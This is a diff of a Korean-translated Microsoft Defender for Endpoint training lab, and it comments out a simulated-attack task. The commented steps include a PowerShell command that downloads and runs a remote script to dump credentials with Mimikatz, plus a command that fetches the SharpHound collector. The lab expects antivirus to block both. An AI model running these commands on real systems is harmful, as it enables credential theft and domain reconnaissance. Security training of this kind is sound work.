@@ -14,7 +14,7 @@ lab:
 
 엔드포인트용 Defender 공격 완화 기능을 탐색하려면 두 개의 시뮬레이션된 공격을 실행합니다.
 
->**참고:** **[대화형 랩 시뮬레이션](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** 을 사용하여 이 랩을 원하는 속도로 클릭할 수 있습니다. 대화형 시뮬레이션과 호스트된 랩 간에 약간의 차이가 있을 수 있지만 보여주는 핵심 개념과 아이디어는 동일합니다. 
+>**참고:** **[대화형 랩 시뮬레이션](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** 을 사용하여 이 랩을 원하는 속도로 클릭할 수 있습니다. 대화형 시뮬레이션과 호스트된 랩 간에 약간의 차이가 있을 수 있지만 보여주는 핵심 개념과 아이디어는 동일합니다.
 
 
 ### 작업 1: 디바이스 온보딩 확인
@@ -43,54 +43,56 @@ lab:
 
 ### 작업 2: 시뮬레이션된 공격
 
-이 작업에서는 WIN1*에서 PowerShell** 을 사용하여 *두 개의 *시뮬레이션된* 공격을 실행하여 엔드포인트용 Microsoft Defender 기능을 탐색합니다.
+>**참고:** 포털의 평가 랩 및 자습서 및 시뮬레이션 섹션을 더 이상 사용할 수 없습니다. 다음 단계는 참조용으로만 제공됩니다. 시뮬레이션된 **[공격에 대한 데모는 대화형 랩 시뮬레이션](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** 을 참조하세요. 시뮬레이션된 공격에 대한 대체 항목을 찾기 위해 노력하고 있습니다.
+
+<!--- In this task, you will run two *simulated* attacks using *PowerShell* on *WIN1* to explore the capabilities of Microsoft Defender for Endpoint.
 
 `Attack 1: Mimikatz - Credential Dumping`
 
-1. WIN1 컴퓨터의 *검색 창에 명령을** 입력**하고 관리자** 권한으로 실행을 선택합니다**.*
+1. On the *WIN1* machine, type **Command** in the search bar and select **Run as administrator**.
 
-1. 다음 명령을 복사하여 관리istrator: 명령 프롬프트 창에 **붙여넣고 Enter** 키를 눌러 **실행**합니다.
+1. Copy and paste the following command in the **Administrator: Command Prompt** window and press **Enter** to run it.
 
     ```CommandPrompt
     powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
     ```
 
-1. Access가 *거부되었다는* 메시지와 위협을 표시하는 *팝업 메시지가 `Microsoft Defender Antivirus, Windows Security Virus and threats protection` 표시됩니다*.
+1. You should see a message that says *Access is denied*, and a pop-up message from `Microsoft Defender Antivirus, Windows Security Virus and threats protection` displaying *Threats found*.
 
-1. 종료를 **입력**하고 Enter 키를 눌러 **관리istrator: 명령 프롬프트** 창을 종료**합니다**.
+1. Exit the **Administrator: Command Prompt** window by typing **exit** and pressing **Enter**.
 
 `Attack 2: Bloodhound - Collection`
 
-1. WIN1 컴퓨터의 *검색 창에 PowerShell**을 입력**하고 Windows PowerShell**을 선택한 **다음 관리자** 권한으로 실행을 선택합니다**.*
+1. On the *WIN1* machine, type **PowerShell** in the search bar, select **Windows PowerShell** and select **Run as administrator**.
 
-1. 다음 명령을 복사하여 관리istrator: Windows PowerShell 창에 **붙여넣고 Enter** 키를 눌러 **실행**합니다.
+1. Copy and paste the following commands in the **Administrator: Windows PowerShell** window and press **Enter** to run it.
 
     ```PowerShell
     New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
     Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
     ```
 
-    >**참고:** 명령을 한 번에 하나씩 복사, 붙여넣기 및 실행하는 것이 좋습니다. 메모장* 열고 *명령을 임시 파일에 복사하여 이 작업을 수행할 수 있습니다. 첫 번째 명령은 Atomic Red Team* 폴더가 있는 동일한 폴더에 ExternalPayloads*라는 *폴더를 *만듭니다. 두 번째 명령은 BloodHound GitHub 리포지토리에서 *SharpHound.ps1** 파일을 다운로드*하고 ExternalPayloads 폴더에 *저장합니다*.
+    >**Note:** It is recommended to copy, paste and run the commands one at a time. You can open *Notepad* and copy the commands into a temporary file to accomplish this. The first command creates a folder named *ExternalPayloads* in the same folder where the *Atomic Red Team* folder is located. The second command downloads the *SharpHound.ps1* file from the *BloodHound* GitHub repository and saves it in the *ExternalPayloads* folder.
 
-1. 발견된 위협이* 표시되면 팝업 메시지가 `Windows Security Virus and threats protection` 표시됩니다*.
+1. You should see a  pop-up message from `Windows Security Virus and threats protection` displaying *Threats found*.
 
-1. 다음 명령을 복사하여 관리istrator: Windows PowerShell 창에 **붙여넣고 Enter** 키를 눌러 **실행**합니다.
+1. Copy and paste the following command in the **Administrator: Windows PowerShell** window and press **Enter** to run it.
 
     ```PowerShell
     Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
     ```
 
-1. 출력이 True*이*면 Microsoft Defender 바이러스 백신 맬웨어 페이로드 파일이 제거되지 않았습니다. 출력이 False*이*면 Microsoft Defender 바이러스 백신 맬웨어 페이로드 파일이 제거되었습니다. 위쪽 화살표 키를 사용하여 출력이 False*가 *될 때까지 명령을 반복합니다.
+1. If the output is *True*, the Malware payload file has not been removed by Microsoft Defender Antivirus. If the output is *False*, the Malware payload file has been removed by Microsoft Defender Antivirus. Use the up-arrow key to repeat the command until the output is *False*. --->
 
-<!---1. From the left menu, under **Endpoints**, select **Evaluation & tutorials** and then select **Tutorials & simulations** from the left side.
+1. 왼쪽 메뉴의 엔드포인트에서 **평가 및 자습서를** 선택한 **다음 왼쪽에서 자습서 및 시뮬레이션을** 선택합니다**.**
 
-1. Select the **Tutorials** tab.
+1. **자습서** 탭을 선택합니다.
 
-1. Under *Automated investigation (backdoor)* you will see a message describing the scenario. Below this paragraph, click **Read the walkthrough**. A new browser tab opens which includes instructions to perform the simulation.
+1. 자동화된 조사(백도어)*에서 *시나리오를 설명하는 메시지가 표시됩니다. 이 단락 아래에서 **연습 확인**을 클릭합니다. 시뮬레이션을 수행하는 지침이 포함된 새 브라우저 탭이 열립니다.
 
-1. In the new browser tab, locate the section named **Run the simulation** (page 5, starting at step 2) and follow the steps to run the attack. **Hint:** The simulation file *RS4_WinATP-Intro-Invoice.docm* can be found back in portal, just below the **Read the walkthrough** you selected in the previous step by selecting the **Get simulation file** button. 
+1. 새 브라우저 탭에서 **시뮬레이션 실행**이라는 섹션(페이지 5, 2단계부터)을 찾고 단계에 따라 공격을 실행합니다. **힌트:** 시뮬레이션 파일 *RS4_WinATP-Intro-Invoice.docm*은 시뮬레이션 파일** 가져오기 단추를 선택하여 **이전 단계에서 선택한 연습** 읽기 바로 아래 **포털에서 다시 찾을 수 있습니다.
 
-1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
+<!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
 
 ### 작업 3: 공격 조사
 
